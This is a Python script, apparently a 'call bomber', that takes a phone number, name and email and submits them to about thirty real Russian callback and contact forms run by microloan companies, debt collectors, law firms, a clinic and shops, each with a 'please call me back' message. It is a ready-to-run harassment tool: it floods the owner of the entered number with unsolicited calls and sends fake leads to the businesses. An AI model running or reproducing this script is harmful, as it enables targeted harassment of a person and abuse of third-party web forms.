import requests

tel = input("Введите номер телефона: ")
name = input("Введите имя: ")
email = input("Введите рандомный email: ")


r = requests.post('https://www.mfovzaimno.ru/server/mail/feedback.php', data={"feedback":tel,"area":"Перезвоните мне пожалуйста","loc":"Контактная информация","name":name})
print(r.text)

r = requests.post('https://ekapusta.com/s/support/anonymous', json={"attachments":[],"email":email,"message":"Перезвоните пожалуйста","name":name, "phone":tel})
print(r.text)

r = requests.post('https://collektors.com/wp-json/contact-form-7/v1/contact-forms/1203/feedback', data={"_wpcf7": "1203","_wpcf7_version": "5.1.9","_wpcf7_locale": "ru_RU","_wpcf7_unit_tag": "wpcf7-f1203-p2-o1","_wpcf7_container_post": "2","text-9": name,"phone1": tel,"primer": "Где деньги?"})
print(r.text)

r = requests.post('http://collector.fors59.ru/', data={"formid": "form","page": "Главная","ref": "https://yandex.ru/","url": "http://collector.fors59.ru//","security":"","name": name,"phone": tel,"email": email,"text": "У меня к вам вопрос"})
print(r)

r = requests.post('https://domrfbank.ru/local/ajax/callback.form.php', data={"breadcrumbs": "Обратный звонок", "source_section": "Частным клиентам", "message":"У меня вопрос", "fio":"Андрей Богатырёв", "phone":tel,"city": "Москва","callback_agreement": "on", "callback_agreement_1": "on"})
print(r.text)

r = requests.post('https://labradoors.ru/ajax/sendmail.php', data={"subject": "Обратный звонок","name": name,"tel": tel})
print(r.text)

r = requests.post('https://www.vishco.ru/client_account/feedback.json', data={"feedback[subject]": "Обратный звонок","feedback[content]": "Обратный звонок","feedback[from]": "info@vishco.ru","feedback[name]": name,"feedback[phone]": tel})
print(r.text)

r = requests.post('https://kupibelie.ru/', data={"nospam":"","name": name,"phone": tel,"form1-submit": "Отправить"})
print(r)

r = requests.post('https://sankom.ru/popup/sendlnform/', data={"question": name,"phone":  tel,"feed": "1"})
print(r)

r = requests.post('https://daitres.ru/callback.html', data={"event": "order", "from": "https://daitres.ru/callback.html", "phone":tel})
print(r)

r = requests.post('https://eda.me/ajax/getcall.php', data={"city": "Москва","domain": "eda.me","tel": tel,"comment": "Хочу сделать заказ по телефону, через сайт не получается"})
print(r.text)

r = requests.post('http://vietshop.ru/call', data={"name": name, "phone": tel, "email": email, "message": "У меня проблема"})
print(r)

r = requests.post('http://in.callibri.ru/module/contactus', json={"feedback":{"client_id": "41084","company": "","custom_fields": {},"email": email,"form_name": "form_b8b721c7697a08b504e51a984f72e579","message": "Перезвоните мне","name": name,"number": "79655285686","page": "http://www.zaim-garant.ru/obratnyj-zvonok/","phone": tel,"session_id": "35340235"}})
print(r.text)

r = requests.post('https://zaim-dc.ru/site/modal_form_telf', data={"name_form_send": name,"fam_form_send": "453","dogv_form_send": "123123","tel_form_send": tel,"comm_form_send": "3"})
print(r.text)

r = requests.post('http://xn--c1a7a0a.xn--p1ai/system/ajax', data={"submitted[nomer]": tel})
print(r)

r = requests.post('https://www.dengiest.ru/wp-json/contact-form-7/v1/contact-forms/1328/feedback', data={"_wpcf7": "1328","_wpcf7_version": "5.0.1","_wpcf7_locale": "ru_RU","_wpcf7_unit_tag": "wpcf7-f1328-p1329-o5","_wpcf7_container_post": "1329","your-name": name,"your-tel": tel,"your-time": "сейчас","consent-checkbox": "1"})
print(r.text)

r = requests.post('https://onicon.ru/my/s3/xapi/public/?method=form/postform&param[form_id]=58651241&param[tpl]=prefixed-form.tpl&prefix=nc-connect', data={"d[0]": name,"d[1]": tel,"d[2]": "asdasddas@mail.ru"})
print(r.text)

r = requests.post('https://onicon.ru/my/s3/xapi/public/?method=form/postform&param[form_id]=58651241&param[tpl]=prefixed-form.tpl&prefix=nc-connect', data={"d[0]": name,"d[1]": tel,"d[2]": "asdasddas@mail.ru"})
print(r.text)

r = requests.post('https://amulex.ru/utm/utm_reciver.php', data={"phone": tel,"email": email,"name": name,"hId": "2781","utm_source": "google","utm_medium": "cpc","utm_campaign": "11392823752","utm_content": "473454257916","utm_term":"%252b%25d1%258e%25d1%2580%25d0%25b8%25d0%25b4%25d0%25b8%25d1%2587%25d0%25b5%25d1%2581%25d0%25ba%25d0%25b0%25d1%258f%2520%252b%25d0%25bf%25d0%25be%25d0%25bc%25d0%25be%25d1%2589%25d1%258c","utm": [],"href": "https://amulex.ru/online-konsultaciya-urista"
})
print(r.text)

r = requests.post('https://juristy-rf.ru/yuridicheskaia/g/yuridicheskaia-pomoshch.php', data={"question": "Жду ваш звонок","name": name,"phone": tel})
print(r)

r = requests.post('https://receiver.pravoved.org/api/v1/events', json={"data":{"name":"CLIENT", "phone":int(tel),"public_lead_id": "5f9c5e9471d3690009836d42","referral":"undefined", "text":"Прошу помочь"},"group-id":"984da61c-e11b-4882-8bd2-2676f830ff63","name":"lead"})
print(r.text)
pass

r = requests.post('https://formdesigner.ru/form/iframe/139052?center=1', data={"field1280538": name,"field1280542": tel})
print(r)

r = requests.post('https://xn--80acgfbsl1azdqr.xn--h1apee9bn.online/', data={"name":"Без имени","question": "Запрос обратного звонка","phone": tel,"location": "Екатеринбург"})
print(r)

r = requests.post('https://1-yur.ru/form-ok.php', data={"avtor": name,"tel": tel,"time": "Сейчас"})
print(r)

r = requests.post('https://1-yur.ru/form-ok2.php', data={"avtor": name,"tel": tel,"prob": "Перезвоните"})
print(r)

r = requests.post('https://yurist.life/wp-json/contact-form-7/v1/contact-forms/1106/feedback', data={"_wpcf7": "1106","_wpcf7_version": "5.3","_wpcf7_locale": "ru_RU","_wpcf7_unit_tag": "wpcf7-f1106-o1","_wpcf7_container_post": "0","_wpcf7_posted_data_hash": "","your-name": name,"tel": tel})
print(r)

r = requests.post('https://www.gmsclinic.ru/ajax/xform.php', data={"formid": "callbackForm","json": "ok","lastname": "","name": name,"phone": tel,"time": "сейчас","comment": "Скажу по телефону","checkpersondata": "Выражено согласие на обработку персональных данных"})
print(r)

r = requests.post('https://api.callibri.ru/module/contactus',json={"feedback": {"client_id": "31817","company": "","custom_fields": {},"email": email,"form_name": "","message": "","name": name,"number": "null","page": "https://stroytek-ek.ru/","phone": tel,"session_id": "50947909"}})
print(r.text)

r = requests.post('https://www.1mfcn.ru/callback/',data={"FORM_ID": "10","FIELD_26": name,"FIELD_27": tel})
print(r)